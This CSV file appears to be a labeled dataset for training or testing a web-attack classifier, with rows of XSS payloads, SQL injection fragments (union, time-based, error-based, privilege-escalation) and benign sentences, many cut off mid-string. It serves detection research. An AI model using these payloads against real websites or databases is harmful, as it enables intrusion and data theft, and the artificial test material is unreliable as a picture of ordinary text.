Payload,Label,text_label,ID
<ul onpointerup=alert(1)>XSS</ul>,1,XSS,2586
1'|| ( select 'vuku' where 3143 = 3143 waitfor del,2,SQLi,13376
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,19084
ORDER BY 9#,2,SQLi,10282
<param id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,8793
"-4856' in boolean mode ) union all select 1074,107",2,SQLi,12748
"<br onmousedown=""alert(1)"">test</br>",1,XSS,3041
-2823' ) ) or 5663 = 4228 and ( ( 'skgh' like 'skg,2,SQLi,17019
"-5078 union all select 9708,9708--",2,SQLi,17687
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4000
"-3805"" ) ) ) union all select 9123,9123,9123,9123,",2,SQLi,15300
"1"" ) ) union all select null,null,null,null#",2,SQLi,18184
"<marquee onclick=""alert(1)"">test</marquee>",1,XSS,6569
"1, ( select ( case when ( 5777 = 5777 ) then 1 els",2,SQLi,15788
1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ),2,SQLi,13943
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11109
"1"" ) ) ) rlike sleep ( 5 ) #",2,SQLi,21252
"`""'><img src='#\x27 onerror=javascript:alert(1)>",1,XSS,426
-8612'+ ( select 'iqla' where 5035 = 5035 union al,2,SQLi,22279
"-8331' ) union all select 1452,1452,1452,1452,1452",2,SQLi,18401
"<thead onmouseout=""alert(1)"">test</thead>",1,XSS,5271
"1%"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""%"" =",2,SQLi,12419
<svg id=x tabindex=1 onbeforedeactivate=alert(1)><,1,XSS,4696
"{""id"":null,""firstName"":""Sally"",""lastName"":""Toh"",""a",0,normal,27282
"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a",2,SQLi,21815
"<ul onpaste=""alert(1)"" contenteditable>test</ul>",1,XSS,6813
"<listing onbeforecut=""alert(1)"" contenteditable>te",1,XSS,2533
Select glass.,0,normal,24521
1' in boolean mode ) and 8189 = ( select count ( *,2,SQLi,12196
Select the link.,0,normal,22885
1' ) ) as myws where 5274 = 5274,2,SQLi,21039
"-1513"" ) as swvd where 2958 = 2958 union all selec",2,SQLi,15338
<time onpointerover=alert(1)>XSS</time>,1,XSS,7018
Select view.,0,normal,24609
"<source onkeypress=""alert(1)"" contenteditable>test",1,XSS,4114
"-7320"" ) where 3907 = 3907 union all select 3907,3",2,SQLi,15364
1' ) ) as dqdv where 8126 = 8126 and 4595 = 4595#,2,SQLi,17414
"1%"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x69",2,SQLi,14607
<style>:target {color: red;}</style><header id=x s,1,XSS,5363
select @@version,2,SQLi,10028
Where's the SQL resource?,0,normal,23402
1%' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 9,2,SQLi,15894
"<shadow onmouseover=""alert(1)"">test</shadow>",1,XSS,5238
I'm planning to pick up some gardening tools.,0,normal,23882
"Tap the star button, and select one of the AR game",0,normal,25502
"<rt onmousemove=""alert(1)"">test</rt>",1,XSS,2199
"{""id"":null,""name"":""Vanillish""}",0,normal,26876
"1"" rlike sleep ( 5 ) #",2,SQLi,15017
We must select now.,0,normal,24433
"1%"" rlike sleep ( 5 ) #",2,SQLi,19455
"<hr onmousemove=""alert(1)"">test</hr>",1,XSS,8703
"-5014"" ) or 2724 in ( ( char ( 113 ) +char ( 113 )",2,SQLi,13855
"<img \x11src=x onerror=""javascript:alert(1)"">",1,XSS,654
"1 ) procedure analyse ( extractvalue ( 9255,concat",2,SQLi,12713
"1"" ) ) or 7552 = ( select count ( * ) from rdb$fie",2,SQLi,16442
<figcaption onpointerenter=alert(1)>XSS</figcaptio,1,XSS,7665
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,16603
"<sup draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,3237
-4262%' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlh,2,SQLi,22239
"-5009 ) where 8463 = 8463 union all select 8463,84",2,SQLi,15560
waitfor delay '0:0:20' /*,2,SQLi,10921
<style>#x{font-family:foo[bar;color:green;}#y];col,1,XSS,9308
"select count ( * ) from generate_series ( 1,500000",2,SQLi,19952
or''=',2,SQLi,22521
"-9023%"" ) ) ) union all select 4490,4490,4490#",2,SQLi,21899
"<plaintext onmouseenter=""alert(1)"">test</plaintext",1,XSS,8568
"<ul draggable=""true"" ondragend=""alert(1)"">test</ul",1,XSS,2101
"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pi",2,SQLi,20250
Check values where required.,0,normal,23354
"-7499%"" ) union all select 1893,1893,1893,1893,189",2,SQLi,21278
1' and 8514 = ( select count ( * ) from domain.dom,2,SQLi,16820
1' ) where 8255 = 8255 or 1022 = ( select count ( ,2,SQLi,15383
<script>alert(1);</script>,1,XSS,1277
"1"" ) where 3679 = 3679",2,SQLi,14358
"-2027%"" ) union all select 2048,2048,2048,2048,204",2,SQLi,12581
"<picture oncut=""alert(1)"" contenteditable>test</pi",1,XSS,4307
"<script>({set/**/$($){_/**/setter=$,_=javascript:a",1,XSS,711
"-5832"" ) or 1650 = 9011--",2,SQLi,20923
"1 and row ( 6237,7469 ) > ( select count ( * ) ,co",2,SQLi,19574
admin'/*,2,SQLi,9904
<style>:target {color: red;}</style><dir id=x styl,1,XSS,2134
select current_setting('log_connections');,2,SQLi,22504
1 ) where 5464 = 5464 or 1022 = ( select count ( *,2,SQLi,21831
-4322' ) ) as magw where 1627 = 1627 or 4747 = dbm,2,SQLi,15564
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10734
"-1993%"" ) or 5903 = ( 'qqpjq'|| ( select case 5903",2,SQLi,16793
1 ) as ndgd where 2367 = 2367 or 8156 = ( select c,2,SQLi,13419
-5089' ) ) as icbb where 1129 = 1129 or 6250 = 965,2,SQLi,22472
"{""id"":null,""firstName"":""Suan Choo"",""lastName"":""Lee",0,normal,27210
"<SVg </onlOad =""1> (_=prompt,_(1)) """">",1,XSS,9057
"exec sp_addsrvrolemember 'name' , 'sysadmin' --",2,SQLi,10044
Select Internet Protocol Version 47003 (or Version,0,normal,25622
"-6747"" or 9323 = 9323#",2,SQLi,12631
admin') or ('1'='1'--,2,SQLi,9915
1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ,2,SQLi,12458
select * from users where id = 1 union select +!<@,2,SQLi,11720
"{""id"":null,""firstName"":""Ken"",""lastName"":""Tan Chye""",0,normal,27321
Selecting table linens can be confusing because th,0,normal,25563
1' ) where 8086 = 8086 and 1430 = 7941--,2,SQLi,22007
"<param onmousedown=""alert(1)"">test</param>",1,XSS,8833
<button onblur=alert(1) id=x></button><input autof,1,XSS,4135
"<time onmousedown=""alert(1)"">test</time>",1,XSS,4625
`'><script>\xE2\x80\xA8javascript:alert(1)</script,1,XSS,567
Fortnite servers are really bad today/tonight. Bee,0,normal,26501
`'><script>\xE2\x80\x80javascript:alert(530)</scri,1,XSS,8976
Select reset.,0,normal,24624
Join for lunch.,0,normal,23011
-8080' ) ) order by 1#,2,SQLi,22026
"<ul ondblclick=""alert(1)"">test</ul>",1,XSS,5384
"-1707 ) or 1570 = convert ( int, ( select char ( 1",2,SQLi,20477
<base onpointerover=alert(1)>XSS</base>,1,XSS,5461
1 ) ) waitfor delay '0:0:5'--,2,SQLi,20427
The best thing I have found it to select pieces of,0,normal,25481
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10737
1 ) union all select null#,2,SQLi,21154
"<script onmouseout=""alert(1)"">test</script>",1,XSS,6950
"1"" ) or 8156 = ( select count ( * ) from generate_",2,SQLi,22009
"-2849' union all select 6491,6491,6491,6491,6491,6",2,SQLi,17439
[a](javascript:window.onerror=confirm;throw%201),1,XSS,9434
"1"" and 9468 = 7105--",2,SQLi,17149
"elt ( 5098 = 2728,1 )",2,SQLi,16556
Let's find out where the jazz concert is.,0,normal,23829
"<article draggable=""true"" ondragstart=""alert(1)"">t",1,XSS,1797
"1%"" and 8635 = ( select count ( * ) from generate_",2,SQLi,19906
He also edited Gregory Lewis Way's translation of ,0,normal,26125
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&l",1,XSS,1059
0 or 1=1,2,SQLi,10159
"<ul onbeforecopy=""alert(1)"" contenteditable>test</",1,XSS,7690
"<meter onmouseout=""alert(1)"">test</meter>",1,XSS,2631
1 ) ) ) and 9660 = ( select count ( * ) from all_u,2,SQLi,15449
"<style>@keyframes x{}</style><area style=""animatio",1,XSS,2733
<svg id=x onfocus=alert(1)>,1,XSS,4819
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,22381
%27%20or%201=1,2,SQLi,10162
<style>@keyframes slidein {}</style><summary style,1,XSS,5649
Select the best photographer.,0,normal,24360
select * from users where id = 1 % ( 1 ) or 1 = 1 ,2,SQLi,11936
1' ) as kbja where 4275 = 4275 and ( select 2* ( i,2,SQLi,17204
Select the perfect wedding jewelry.,0,normal,24388
"<style></style\x0D<img src=""about:blank"" onerror=j",1,XSS,446
Where is the database file?,0,normal,23458
<style>:target {transform: rotate(180deg);}</style,1,XSS,8916
"<rt draggable=""true"" ondragend=""alert(1)"">test</rt",1,XSS,4803
"-3442' in boolean mode ) union all select 6255,625",2,SQLi,17431
<h1 onpointerenter=alert(1)>XSS</h1>,1,XSS,2545
<menuitem onpointerenter=alert(1)>XSS</menuitem>,1,XSS,4626
1' ) as wpmv where 1479 = 1479 and 3754 = ( select,2,SQLi,18718
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10470
"1' where 4334 = 4334 or elt ( 5873 = 5873,sleep ( ",2,SQLi,15984
1 or sleep ( 5 ),2,SQLi,16028
<small id=x tabindex=1 onfocusin=alert(1)></small>,1,XSS,8615
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://",1,XSS,285
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS'",1,XSS,999
select case when 4176 = 6138 then 1 else null end-,2,SQLi,14398
"<body oncopy=""alert(1)"" contenteditable>test</body",1,XSS,5023
Select your conversation.,0,normal,24904
1%' ) ) or 9643 = ( select count ( * ) from domain,2,SQLi,13716
<var id=x tabindex=1 ondeactivate=alert(1)></var><,1,XSS,7364
"-4121%"" ) union all select 2659,2659,2659,2659,265",2,SQLi,19481
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,15206
Today it's available as an optional topping at sel,0,normal,25241
"<rtc onkeyup=""alert(1)"" contenteditable>test</rtc>",1,XSS,4771
"<meter onmouseover=""alert(1)"">test</meter>",1,XSS,4284
"<pre onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,7202
1' ) where 8252 = 8252 or 8514 = benchmark ( 50000,2,SQLi,21971
"<area onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,4536
"To create a bookmark for the current solution, sel",0,normal,25277
1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 1,2,SQLi,15094
"1%' ) ) ) union all select null,null,null,null,nul",2,SQLi,16643
<svg><element onload=alert(1)></element>,1,XSS,7533
1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6,2,SQLi,14254
"<object draggable=""true"" ondrag=""alert(1)"">test</o",1,XSS,7043
<%script>alert(âXSSâ)<%/script>,1,XSS,9751
<style>:target {transform: rotate(180deg);}</style,1,XSS,8472
<h1 onpointerdown=alert(1)>XSS</h1>,1,XSS,3664
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) |",2,SQLi,19701
"<pre onbeforepaste=""alert(1)"" contenteditable>test",1,XSS,8355
<menu onpointerover=alert(1)>XSS</menu>,1,XSS,5429
<marquee onpointerenter=alert(1)>XSS</marquee>,1,XSS,2381
1,0,normal,26694
"-1663' or elt ( 1032 = 1032,3623 ) and 'yqaj' like",2,SQLi,15366
"<img src=x onerror=\x00""javascript:alert(1)"">",1,XSS,683
"<style><img title=""</style><img src onerror=alert(",1,XSS,112
They did not conduct any bidding to select the und,0,normal,25311
"<noembed draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,8345
"<xmp draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,7327
"1"" ) ) as uycc where 4364 = 4364 and char ( 107 ) ",2,SQLi,13135
"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( ",2,SQLi,17115
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3414
"{""id"":null,""name"":""definition""}",0,normal,27032
"<script onmouseleave=""alert(1)"">test</script>",1,XSS,3980
"1%"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99",2,SQLi,22115
"<mark onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,4406
<style>@keyframes slidein {}</style><nextid style=,1,XSS,7396
&lt;DIV STYLE=&quot;background-image: url(javascri,1,XSS,1376
1' ) where 9175 = 9175,2,SQLi,13445
"{""id"":null,""firstName"":""Khairul"",""lastName"":""Asyra",0,normal,27035
1'|| ( select 'tjzy' where 3037 = 3037,2,SQLi,18992
"1"" or 7417 = ( select count ( * ) from sysibm.syst",2,SQLi,18329
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,19774
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1,XSS,4318
Select a workout that challenges you.,0,normal,24002
1'+ ( select zpns where 6922 = 6922 and ( select 9,2,SQLi,16295
Where's the cat?,0,normal,23477
Select refuse.,0,normal,24580
"<frame ondblclick=""alert(1)"">test</frame>",1,XSS,2663
1' ) and 4386 = utl_inaddr.get_host_address ( chr ,2,SQLi,19944
"<optgroup oncut=""alert(1)"" contenteditable>test</o",1,XSS,5705
"-9295 ) ) ) or 1570 = convert ( int, ( select char",2,SQLi,12379
x000003C,1,XSS,7023
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,11002
"-9762 ) or elt ( 5773 = 8986,8986 )",2,SQLi,20783
1%' or 2633 = dbms_pipe.receive_message ( chr ( 11,2,SQLi,12212
"<dfn onmouseout=""alert(1)"">test</dfn>",1,XSS,3791
-4538' ) ) ) or 3260 = 1236 and ( ( ( 'hpnd' like ,2,SQLi,15760
"-7749"" or ( 2689 = 7481 ) *7481",2,SQLi,20303
"<img src=1 onerror=""s=document.createElement('scri",1,XSS,9471
1' where 8099 = 8099,2,SQLi,14363
"<isindex draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,6262
1' where 1628 = 1628,2,SQLi,18338
"<IMG SRC=""`<javascript:alert>`('')""",1,XSS,7602
1 ) where 7571 = 7571 and char ( 109 ) ||char ( 79,2,SQLi,17105
"1"" ) ) and ( 1248 = 8705 ) *8705 and ( ( ""wvma"" li",2,SQLi,15939
1%' ) ) and exp ( ~ ( select * from ( select conca,2,SQLi,20272
<video id=x tabindex=1 ondeactivate=alert(1)></vid,1,XSS,5945
1,0,normal,26680
1' in boolean mode ) and 9254 = ( select count ( *,2,SQLi,17426
"1"" ) where 9545 = 9545 and 9198 = 9198--",2,SQLi,21694
1%' ) ( select ( case when ( 4587 = 4587 ) then re,2,SQLi,12405
1 ) as zqxa where 5718 = 5718 and 3580 = ( select ,2,SQLi,17760
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javas",1,XSS,649
"-8327 where 7555 = 7555 or 1570 = convert ( int, (",2,SQLi,16184
"-2067"" or 3038 = 3038",2,SQLi,17612
"<table onbeforecopy=""alert(1)"" contenteditable>tes",1,XSS,7337
1 ) as pyjx where 9005 = 9005,2,SQLi,17142
"-6496"" ) ) ) or 1471 = 5278 and ( ( ( ""zkoj"" = ""zk",2,SQLi,15817
<nextid onpointerenter=alert(1)>XSS</nextid>,1,XSS,6223
Plant flowers.,0,normal,23025
-1816%' ) ) ) union all select 2072--,2,SQLi,16982
Select next.,0,normal,24487
"1"" ) ) ) union all select null,null,null,null,null",2,SQLi,20630
1 ) as kqas where 7302 = 7302 and 8407 = ( select ,2,SQLi,18145
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10434
<var id=x tabindex=1 onfocus=alert(1)></var>,1,XSS,3654
(select(0)from(select(sleep(5)))v)%2f'+(select(0)f,2,SQLi,11152
"1"" ) where 6821 = 6821 waitfor delay '0:0:5'--",2,SQLi,17029
"<select oncut=""alert(1)"" contenteditable>test</sel",1,XSS,7414
"<section onbeforepaste=""alert(1)"" contenteditable>",1,XSS,3687
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10635
"1"" ) ) as upvg where 4826 = 4826",2,SQLi,20798
1' in boolean mode ) or ( select * from ( select (,2,SQLi,18482
You must select.,0,normal,24451
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,2483
1 ) and 6510 = ( select count ( * ) from sysusers ,2,SQLi,18442
select sleep ( 5 ) and ( ( ( 'rzjf' = 'rzjf,2,SQLi,15088
<spacer onpointermove=alert(1)>XSS</spacer>,1,XSS,6906
"-3541"" or make_set ( 9354 = 9354,7185 ) and ""fgxu""",2,SQLi,17749
"select count ( * ) from generate_series ( 1,500000",2,SQLi,14103
"<thead onpaste=""alert(1)"" contenteditable>test</th",1,XSS,7535
1' ) ) ) and exp ( ~ ( select * from ( select conc,2,SQLi,14581
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></",1,XSS,9050
-1643' where 1968 = 1968 or 3484 = 6642,2,SQLi,21654
"-1874"" ) as wgpj where 6481 = 6481 or 3629 = 3459",2,SQLi,22189
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=java",1,XSS,1604
"1%"" ) ) ) union all select null,null,null,null,nul",2,SQLi,18611
"1%"" ) ) ) or row ( 1045,7562 ) > ( select count ( ",2,SQLi,15827
"))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE",2,SQLi,11253
"1"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ",2,SQLi,19047
<style>:target {color: red;}</style><legend id=x s,1,XSS,3478
Filter calls.,0,normal,23024
"1"" ) as saqy where 9704 = 9704 ( select ( case whe",2,SQLi,13198
"1"" ) where 9359 = 9359 or 2367 = ( select count ( ",2,SQLi,18192
"1' ) union all select null,null,null--",2,SQLi,22000
1%' ) ) or ( select * from ( select ( sleep ( 5 ) ,2,SQLi,16789
"{""id"":null,""firstName"":""Yan Feng"",""lastName"":""Yee""",0,normal,26869
Select a topic for a blog post.,0,normal,24083
"<param oncontextmenu=""alert(1)"">test</param>",1,XSS,7124
1'+ ( select vupb where 9575 = 9575 union all sele,2,SQLi,19548
"-7996"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash",2,SQLi,17862
1' ) ) ) or ( select * from ( select ( sleep ( 5 ),2,SQLi,16761
select sleep ( 5 ) and ( ( 'ilcv' = 'ilcv,2,SQLi,15047
Select win.,0,normal,24669
<b id=x tabindex=1 onactivate=alert(1)></b>,1,XSS,7071
"1' ) ) procedure analyse ( extractvalue ( 5840,con",2,SQLi,22173
Select the right colors for the design.,0,normal,24207
"1"" ) where 2152 = 2152",2,SQLi,18839
1' ) where 8948 = 8948 and 8635 = ( select count (,2,SQLi,20255
"<basefont oncontextmenu=""alert(1)"">test</basefont>",1,XSS,4778
"<nextid oncopy=""alert(1)"" contenteditable>test</ne",1,XSS,8825
%20$(sleep%2050),2,SQLi,10116
<style>@keyframes slidein {}</style><acronym style,1,XSS,8502
"-3632' or make_set ( 9354 = 9354,7185 ) and 'lgpy'",2,SQLi,18761
"<a onpaste=""alert(1)"" contenteditable>test</a>",1,XSS,85
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10501
"1"" ) ) as eagr where 3366 = 3366 and elt ( 4249 = ",2,SQLi,18421
<element onpointerover=alert(1)>XSS</element>,1,XSS,3854
Specify criteria where required.,0,normal,23267
select * from users where id = 1 +$+. or 1 = 1 -- ,2,SQLi,11459
1 ) where 7096 = 7096,2,SQLi,15434
"select count ( * ) from sysibm.systables as t1,sys",2,SQLi,21482
1' ) ) and 4242 = 5831 and ( ( 'xflh' like 'xflh,2,SQLi,15263
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10435
"In Egypt, Uber also offers UberX, Select and Scoot",0,normal,26011
"<param draggable=""true"" ondragenter=""alert(1)"">tes",1,XSS,3610
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11078
It is merely necessary to select some larger or sm,0,normal,25963
<mark onpointerout=alert(1)>XSS</mark>,1,XSS,6156
Select your fall.,0,normal,25018
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")",1,XSS,1322
1'|| ( select 'kzkr' from dual where 2778 = 2778,2,SQLi,19915
A register address select line 91 provides a contr,0,normal,26432
"-2790%"" ) union all select 5070,5070#",2,SQLi,20157
select,0,normal,26576
<slot onpointerleave=alert(1)>XSS</slot>,1,XSS,5383
"<style>@keyframes x{}</style><td style=""animation-",1,XSS,5820
"-8868"" ) where 5681 = 5681 union all select 5681,5",2,SQLi,13357
-4961' ) or 3038 = 3038,2,SQLi,18030
"<header onkeyup=""alert(1)"" contenteditable>test</h",1,XSS,6118
